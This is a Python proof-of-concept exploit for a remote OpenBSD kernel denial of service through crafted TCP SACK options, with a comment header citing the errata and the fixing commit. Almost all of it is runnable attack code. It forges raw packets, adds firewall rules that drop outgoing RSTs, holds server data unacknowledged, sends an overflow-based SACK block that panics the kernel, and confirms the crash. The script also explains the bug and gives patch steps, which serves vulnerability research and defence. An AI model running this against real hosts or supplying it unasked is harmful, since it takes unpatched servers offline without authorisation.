#!/usr/bin/env python3
#
# OpenBSD TCP SACK Remote Kernel Denial of Service
# Errata: OpenBSD 7.8 #025 / 7.7 #031 (March 25, 2026)
#
# A NULL pointer dereference in tcp_sack_option() allows a remote attacker
# to panic an unpatched OpenBSD kernel via crafted TCP SACK options. The
# vulnerability stems from missing validation of sack.start against snd_una
# and a missing NULL pointer guard in the SACK hole append path. Signed
# integer overflow in the SEQ_LT/SEQ_LEQ macros causes contradictory
# comparison results, allowing an attacker to delete a SACK hole (setting
# the list pointer to NULL) and then trigger the append path which
# dereferences the NULL pointer.
#
# Affected:  OpenBSD <= 7.8 (unpatched), likely all versions since ~1999
# Fixed:     commit 0e8206e596ad in sys/netinet/tcp_input.c
# Severity:  Remote DoS (kernel panic, requires reboot)
# Auth:      None — any TCP connection suffices
#
# References:
#   https://www.openbsd.org/errata78.html (entry #025)
#   https://github.com/openbsd/src/commit/0e8206e596add74fef1653b4472de6b3723c435f
#
# Requirements:
#   - Root or CAP_NET_RAW (raw sockets)
#   - Direct L2/L3 path to target (not through a TCP proxy or NAT)
#   - Outgoing RST packets to target must be suppressed:
#       iptables -A OUTPUT -p tcp --tcp-flags RST RST -d <target> -j DROP
#   - Target must have TCP SACK enabled (default on OpenBSD)
#   - Target must have at least one listening TCP service
#
# Limitations:
#   - Does NOT work through QEMU user-mode NAT (use TAP/bridge instead)
#   - Does NOT affect non-OpenBSD systems (different TCP SACK implementation)
#   - Patched systems (errata #025/#031) will silently drop the crafted SACK
#
# Usage:
#   python3 poc_sack.py <target_ip> [target_port]
#

import socket
import struct
import subprocess
import sys
import time


# ---------------------------------------------------------------------------
# Network helpers
# ---------------------------------------------------------------------------

def tcp_checksum(src, dst, tcp_segment):
    """Compute TCP checksum over pseudo-header + segment."""
    pseudo = struct.pack('!4s4sBBH',
                         socket.inet_aton(src),
                         socket.inet_aton(dst),
                         0, 6, len(tcp_segment))
    data = pseudo + tcp_segment
    if len(data) % 2:
        data += b'\x00'
    words = struct.unpack('!%dH' % (len(data) // 2), data)
    total = sum(words)
    total = (total >> 16) + (total & 0xffff)
    total += total >> 16
    return ~total & 0xffff


def build_packet(src_ip, dst_ip, src_port, dst_port,
                 seq, ack, flags, options=b'', payload=b''):
    """Construct a raw IP + TCP packet with correct checksums."""

    # Pad TCP options to 4-byte boundary.
    while len(options) % 4:
        options += b'\x01'  # NOP padding

    tcp_header_len = 20 + len(options)
    data_offset = (tcp_header_len // 4) << 4

    # Build TCP header with zero checksum for initial calculation.
    tcp_header = struct.pack('!HHIIBBHHH',
                             src_port, dst_port,
                             seq & 0xFFFFFFFF,
                             ack & 0xFFFFFFFF,
                             data_offset, flags,
                             32768,  # window size
                             0,      # checksum placeholder
                             0)      # urgent pointer

    tcp_segment = tcp_header + options + payload
    csum = tcp_checksum(src_ip, dst_ip, tcp_segment)

    # Rebuild with correct checksum.
    tcp_header = struct.pack('!HHIIBBHHH',
                             src_port, dst_port,
                             seq & 0xFFFFFFFF,
                             ack & 0xFFFFFFFF,
                             data_offset, flags,
                             32768, csum, 0)

    tcp_segment = tcp_header + options + payload

    # IP header (kernel fills checksum for IPPROTO_RAW).
    ip_header = struct.pack('!BBHHHBBH4s4s',
                            0x45,    # version + IHL
                            0,       # DSCP/ECN
                            20 + len(tcp_segment),
                            54321,   # identification
                            0x4000,  # flags (DF)
                            64,      # TTL
                            6,       # protocol (TCP)
                            0,       # checksum (kernel fills)
                            socket.inet_aton(src_ip),
                            socket.inet_aton(dst_ip))

    return ip_header + tcp_segment


def build_sack_option(blocks):
    """Encode one or more SACK blocks as a TCP option (kind=5)."""
    payload = b''
    for start, end in blocks:
        payload += struct.pack('!II', start & 0xFFFFFFFF, end & 0xFFFFFFFF)
    return struct.pack('BB', 5, 2 + len(payload)) + payload


def build_syn_options():
    """MSS 1460 + SACK Permitted, padded to 4-byte boundary."""
    mss = struct.pack('!BBH', 2, 4, 1460)
    sack_ok = b'\x04\x02'
    pad = b'\x01\x01'
    return mss + sack_ok + pad


def receive_packet(raw_socket, expected_src, expected_sport, local_port,
                   timeout=5):
    """Wait for a TCP packet from the expected source."""
    deadline = time.time() + timeout
    while time.time() < deadline:
        try:
            remaining = max(0.1, deadline - time.time())
            raw_socket.settimeout(remaining)
            data, _ = raw_socket.recvfrom(65535)
        except socket.timeout:
            return None

        if len(data) < 40:
            continue

        ip_header_len = (data[0] & 0x0F) * 4
        src_ip = socket.inet_ntoa(data[12:16])
        if src_ip != expected_src:
            continue

        tcp_data = data[ip_header_len:]
        sport, dport, seq, ack_num = struct.unpack('!HHII', tcp_data[:12])
        if dport != local_port or sport != expected_sport:
            continue

        flags = tcp_data[13]
        window = struct.unpack('!H', tcp_data[14:16])[0]
        tcp_header_len = ((tcp_data[12] >> 4) & 0xF) * 4
        payload = tcp_data[tcp_header_len:]

        return (seq, ack_num, flags, payload, window)

    return None


def detect_local_ip(target):
    """Determine which local IP routes to the target."""
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    s.connect((target, 1))
    local = s.getsockname()[0]
    s.close()
    return local


def find_iptables():
    """Locate iptables or iptables-legacy binary."""
    for name in ['iptables', 'iptables-legacy', '/usr/sbin/iptables',
                 '/sbin/iptables']:
        try:
            result = subprocess.run([name, '--version'],
                                   capture_output=True, timeout=3)
            if result.returncode == 0:
                return name
        except (FileNotFoundError, Exception):
            continue

    # NixOS and other systems may use nft directly.
    for name in ['nft', '/usr/sbin/nft']:
        try:
            result = subprocess.run([name, '--version'],
                                   capture_output=True, timeout=3)
            if result.returncode == 0:
                return None  # signal to use nft path
        except (FileNotFoundError, Exception):
            continue

    return None


def check_rst_rule(target):
    """Check if an RST suppression rule is already in place."""
    ipt = find_iptables()
    if ipt:
        try:
            result = subprocess.run(
                [ipt, '-C', 'OUTPUT', '-p', 'tcp',
                 '--tcp-flags', 'RST', 'RST', '-d', target, '-j', 'DROP'],
                capture_output=True, timeout=3)
            return result.returncode == 0
        except Exception:
            pass

    # Check nft for an existing rule.
    try:
        result = subprocess.run(['nft', 'list', 'ruleset'],
                               capture_output=True, text=True, timeout=3)
        if target in result.stdout and 'rst' in result.stdout.lower():
            return True
    except Exception:
        pass

    return False


def add_rst_rule(target):
    """Add RST suppression rule. Returns ('iptables'|'nft'|None, success)."""
    ipt = find_iptables()

    # Try iptables first.
    if ipt:
        result = subprocess.run(
            [ipt, '-A', 'OUTPUT', '-p', 'tcp',
             '--tcp-flags', 'RST', 'RST', '-d', target, '-j', 'DROP'],
            capture_output=True, text=True)
        if result.returncode == 0:
            return ('iptables', ipt, True)
        # iptables exists but failed — report error.
        return ('iptables', ipt, False)

    # Fall back to nft.
    # Use a single atomic ruleset to avoid partial failures.
    nft_script = (
        f'table ip sack_poc {{\n'
        f'  chain output {{\n'
        f'    type filter hook output priority -300; policy accept;\n'
        f'    tcp flags rst ip daddr {target} drop\n'
        f'  }}\n'
        f'}}\n'
    )
    result = subprocess.run(['nft', '-f', '-'],
                           input=nft_script,
                           capture_output=True, text=True)
    if result.returncode == 0:
        return ('nft', 'nft', True)
    return ('nft', 'nft', False)


def remove_rst_rule(target, method, binary):
    """Remove the RST suppression rule we added."""
    if method == 'iptables':
        subprocess.run(
            [binary, '-D', 'OUTPUT', '-p', 'tcp',
             '--tcp-flags', 'RST', 'RST', '-d', target, '-j', 'DROP'],
            capture_output=True)
    elif method == 'nft':
        subprocess.run(['nft', 'delete table ip sack_poc'],
                      capture_output=True)


def flush_socket(sock):
    """Drain any stale packets from a raw socket."""
    sock.settimeout(0.1)
    while True:
        try:
            sock.recvfrom(65535)
        except Exception:
            break


# ---------------------------------------------------------------------------
# Exploit
# ---------------------------------------------------------------------------

TCP_SYN     = 0x02
TCP_ACK     = 0x10
TCP_PSH_ACK = 0x18
TCP_SYN_ACK = 0x12

def exploit(target, port):
    """
    Execute the SACK crash against the target.

    Returns True if the target appears to have crashed, False otherwise.
    """

    local_ip = detect_local_ip(target)
    local_port = 44444 + int(time.time() * 1000) % 10000
    rst_rule_added = False  # track if we added it, so we can clean up

    print(f"[*] OpenBSD SACK Remote Kernel DoS (Errata #025)")
    print(f"[*] Target:  {target}:{port}")
    print(f"[*] Source:  {local_ip}:{local_port}")
    print()

    # --- Preflight checks ---

    # This exploit only affects OpenBSD's tcp_sack_option() implementation.
    # Other TCP stacks (Linux, FreeBSD, Windows) are not vulnerable.
    # We cannot reliably fingerprint the OS before the crash attempt, but
    # we check the RST suppression rule which is required regardless.

    if not check_rst_rule(target):
        print(f"[!] No iptables RST suppression rule detected.")
        print(f"    The local kernel will RST our raw TCP connection before")
        print(f"    the server can send data, causing the exploit to fail.")
        print()
        print(f"    NOTE: This exploit ONLY affects OpenBSD. Linux, FreeBSD,")
        print(f"    and other operating systems are not vulnerable.")
        print()
        try:
            answer = input(f"    Add RST rule automatically? [y/N] ")
        except (EOFError, KeyboardInterrupt):
            answer = 'n'
        if answer.strip().lower() == 'y':
            method, binary, success = add_rst_rule(target)
            if success:
                rst_rule_added = (method, binary)
                print(f"    [+] RST rule added via {method} "
                      f"(will be removed on exit).")
            else:
                print(f"    [-] Failed to add rule via {method}.")
                print(f"    Add it manually and re-run.")
                return False
        else:
            print(f"    Aborting. Add the rule and re-run.")
            return False
        print()

    # Open raw sockets for sending and receiving.
    send_sock = socket.socket(socket.AF_INET, socket.SOCK_RAW,
                              socket.IPPROTO_RAW)
    send_sock.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)

    recv_sock = socket.socket(socket.AF_INET, socket.SOCK_RAW,
                              socket.IPPROTO_TCP)
    flush_socket(recv_sock)

    # ------------------------------------------------------------------
    # Phase 1 — TCP handshake (raw, to avoid kernel auto-ACK behavior)
    # ------------------------------------------------------------------

    print("[1] Establishing TCP connection...")

    initial_seq = 100000
    syn = build_packet(local_ip, target, local_port, port,
                       initial_seq, 0, TCP_SYN,
                       options=build_syn_options())
    send_sock.sendto(syn, (target, 0))

    response = receive_packet(recv_sock, target, port, local_port)
    if response is None or response[2] != TCP_SYN_ACK:
        print("    [-] No SYN-ACK received.")
        print("        Possible causes:")
        print("        - Target is down or port is not open")
        print("        - Outgoing RST not blocked (kernel killed our SYN)")
        print("        - Firewall between attacker and target")
        print("        - Not a direct network path (NAT/proxy in the way)")
        return False

    server_isn = response[0]
    our_seq = response[1]       # our ISN + 1
    snd_una = server_isn + 1    # server's first data sequence number
    syn_ack_window = response[4]

    # OpenBSD SYN-ACK typically uses window size 16384. Other common values:
    #   Linux: 65535 or 29200    FreeBSD: 65535    Windows: 8192/65535
    # This is a heuristic, not definitive.
    if syn_ack_window != 16384:
        print(f"    [!] SYN-ACK window = {syn_ack_window} (OpenBSD typically "
              f"uses 16384).")
        print(f"        Target may not be OpenBSD. This exploit ONLY affects "
              f"OpenBSD.")
        print(f"        Continuing anyway...")
        print()

    # Complete the three-way handshake.
    ack = build_packet(local_ip, target, local_port, port,
                       our_seq, snd_una, TCP_ACK)
    send_sock.sendto(ack, (target, 0))

    print(f"    [+] Connected. Server ISN: {server_isn}")

    # ------------------------------------------------------------------
    # Phase 2 — Accumulate unacknowledged server data
    # ------------------------------------------------------------------

    print("[2] Accumulating unacknowledged server data...")

    # Receive the server's initial data (e.g., SSH banner).
    response = receive_packet(recv_sock, target, port, local_port, timeout=3)
    if response is not None and len(response[3]) > 0:
        snd_una = (response[0] + len(response[3])) & 0xFFFFFFFF
        banner_text = response[3][:40]
        print(f"    [+] Received {len(response[3])} bytes: {banner_text}")

    # Acknowledge the banner and send a client greeting to trigger
    # additional server data (SSH KEX_INIT, HTTP response, etc.).
    if port == 22:
        client_data = b"SSH-2.0-OpenSSH_9.9\r\n"
    else:
        client_data = b"GET / HTTP/1.0\r\nHost: target\r\n\r\n"

    pkt = build_packet(local_ip, target, local_port, port,
                       our_seq, snd_una, TCP_PSH_ACK,
                       payload=client_data)
    send_sock.sendto(pkt, (target, 0))
    our_seq = (our_seq + len(client_data)) & 0xFFFFFFFF

    # Wait for the server's response data, but do NOT acknowledge it.
    # This ensures snd_max > snd_una on the server, which is required
    # for the SACK hole machinery to be active.
    time.sleep(2)
    snd_max = snd_una
    for _ in range(20):
        response = receive_packet(recv_sock, target, port, local_port,
                                  timeout=1)
        if response is None:
            break
        if len(response[3]) > 0:
            snd_max = (response[0] + len(response[3])) & 0xFFFFFFFF

    unacked = (snd_max - snd_una) & 0xFFFFFFFF
    print(f"    [+] Unacknowledged data: {unacked} bytes "
          f"(snd_una={snd_una}, snd_max={snd_max})")

    if unacked < 400:
        print(f"    [-] Insufficient unacknowledged data (need >= 400).")
        print(f"        Possible causes:")
        print(f"        - RST suppression rule not in place (most common)")
        print(f"        - Target behind NAT/proxy (QEMU user-mode won't work)")
        print(f"        - Service did not send enough data after greeting")
        print(f"        - Connection was reset between phases")
        return False

    # ------------------------------------------------------------------
    # Phase 3 — Send the crash packet
    # ------------------------------------------------------------------
    #
    # The crash packet contains two SACK blocks in a single TCP segment:
    #
    # Block 1 (normal):
    #   [snd_una + 346, snd_una + 546]
    #   This creates a SACK hole [snd_una, snd_una + 346] on the server
    #   and sets rcv_lastsack = snd_una + 546.
    #
    # Block 2 (overflow):
    #   [snd_una + 0x80000190, snd_una + 399]
    #   The start value is snd_una + 2^31 + 400. Due to signed integer
    #   overflow in the SEQ_LEQ macro, this value appears to be LESS THAN
    #   OR EQUAL to the hole's start (snd_una), causing the code to delete
    #   the hole and set p = NULL. Simultaneously, the SEQ_LT macro
    #   evaluating rcv_lastsack < sack.start also overflows, returning
    #   TRUE, which triggers the append code path. The append path then
    #   dereferences p->next where p is NULL, causing a kernel page fault.
    #
    #   The end value (snd_una + 399) is within the valid send window,
    #   so it passes all server-side validation checks. The vulnerable
    #   code does not validate sack.start against snd_una, which is the
    #   root cause — the fix adds this check.

    print("[3] Sending crash packet...")

    block_normal = (
        (snd_una + 346) & 0xFFFFFFFF,
        (snd_una + 546) & 0xFFFFFFFF
    )
    block_overflow = (
        (snd_una + 0x80000000 + 400) & 0xFFFFFFFF,
        (snd_una + 399) & 0xFFFFFFFF
    )

    sack_option = build_sack_option([block_normal, block_overflow])

    crash_pkt = build_packet(local_ip, target, local_port, port,
                             our_seq, snd_una, TCP_ACK,
                             options=sack_option)
    send_sock.sendto(crash_pkt, (target, 0))

    print(f"    [+] Packet sent.")
    print(f"        Block 1: [{block_normal[0]}, {block_normal[1]}]")
    print(f"        Block 2: [0x{block_overflow[0]:08x}, {block_overflow[1]}]")

    # ------------------------------------------------------------------
    # Phase 4 — Verify the crash
    # ------------------------------------------------------------------

    print("[4] Verifying target status...")
    time.sleep(3)

    # Attempt to open a new TCP connection.
    crashed = False
    try:
        probe = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        probe.settimeout(5)
        probe.connect((target, port))
        probe.close()
        print("    [-] Target is responsive. Exploit did not succeed.")
        print("        Possible explanations:")
        print("        - Target is patched (errata #025 / #031 applied)")
        print("        - Target is not OpenBSD (different TCP stack)")
        print("        - SACK disabled on target (sysctl net.inet.tcp.sack=0)")
    except Exception:
        # Confirm with ICMP.
        try:
            result = subprocess.run(
                ['ping', '-c', '2', '-W', '2', target],
                capture_output=True, text=True, timeout=10)
            if '0 received' in result.stdout or '100% packet loss' in result.stdout:
                print("    [!] Target is unresponsive. Kernel panic confirmed.")
                crashed = True
            else:
                print("    [?] TCP connection refused but host responds to ping.")
                print("        The service may have crashed without a kernel panic.")
        except Exception:
            print("    [!] Target is unresponsive. Kernel panic likely.")
            crashed = True

    # Cleanup.
    send_sock.close()
    recv_sock.close()

    if rst_rule_added:
        method, binary = rst_rule_added
        print()
        print(f"[*] Removing RST suppression rule ({method})...")
        remove_rst_rule(target, method, binary)

    return crashed


# ---------------------------------------------------------------------------
# Entry point
# ---------------------------------------------------------------------------

def main():
    if len(sys.argv) < 2:
        print("OpenBSD TCP SACK Remote Kernel DoS — Errata #025")
        print()
        print(f"Usage: python3 {sys.argv[0]} <target_ip> [port]")
        print()
        print("Prerequisites:")
        print("  - Root privileges (raw sockets)")
        print("  - Direct network path to target (not through NAT/proxy)")
        print("  - Suppress outgoing RSTs to target:")
        print("      iptables -A OUTPUT -p tcp --tcp-flags RST RST "
              "-d <target> -j DROP")
        print()
        print("Patch detection (run on target):")
        print("  syspatch -l | grep 025_sack")
        sys.exit(1)

    target_ip = sys.argv[1]
    target_port = int(sys.argv[2]) if len(sys.argv) > 2 else 22

    crashed = exploit(target_ip, target_port)

    if crashed:
        print()
        print("[*] The target kernel has panicked and requires a reboot.")
        print("[*] Apply the fix: syspatch (installs errata #025)")

    sys.exit(0 if crashed else 1)


if __name__ == '__main__':
    main()
